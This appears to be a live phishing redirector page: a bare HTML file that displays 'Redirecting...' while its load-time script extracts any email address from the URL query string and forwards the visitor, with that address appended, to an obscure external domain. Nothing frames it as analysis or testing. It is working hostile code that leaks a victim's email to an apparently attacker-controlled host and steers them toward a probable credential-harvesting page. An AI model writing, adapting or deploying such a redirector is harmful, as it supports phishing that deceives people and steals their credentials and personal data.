<!DOCTYPE html>
<html>
<head>
  <script>
    window.onload = function () {
      const query = window.location.search;
      const emailRegex = /[?&][^=]*=([^&]*@[^&]*)/i; // Look for any parameter containing an email

      const match = query.match(emailRegex);
      const email = match ? decodeURIComponent(match[1]) : null;

      if (email) {
        const targetUrl = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/*' + email;
        window.location.href = targetUrl;
      } else {
        window.location.href = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/';
      }
    };
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
